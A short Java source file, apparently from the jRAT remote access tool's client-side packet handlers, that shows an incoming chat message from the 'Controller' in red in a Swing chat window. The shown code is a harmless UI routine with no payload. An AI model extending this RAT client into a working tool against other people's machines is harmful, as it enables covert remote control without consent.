package jrat.client.packets.incoming;

import jrat.client.Connection;

import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import java.awt.*;


public class Packet51ChatMessage implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (con.getFrameChat() != null) {
			String message = con.readLine();
			StyleContext sc = StyleContext.getDefaultStyleContext();
			AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.red);
			con.getFrameChat().txtChat.getDocument().insertString(con.getFrameChat().txtChat.getDocument().getLength(), "Controller: " + message + "\n", set);
			con.getFrameChat().txtChat.setSelectionEnd(con.getFrameChat().txtChat.getText().length());
			con.getFrameChat().txtChat.setSelectionStart(con.getFrameChat().txtChat.getText().length());
		}
	}

}
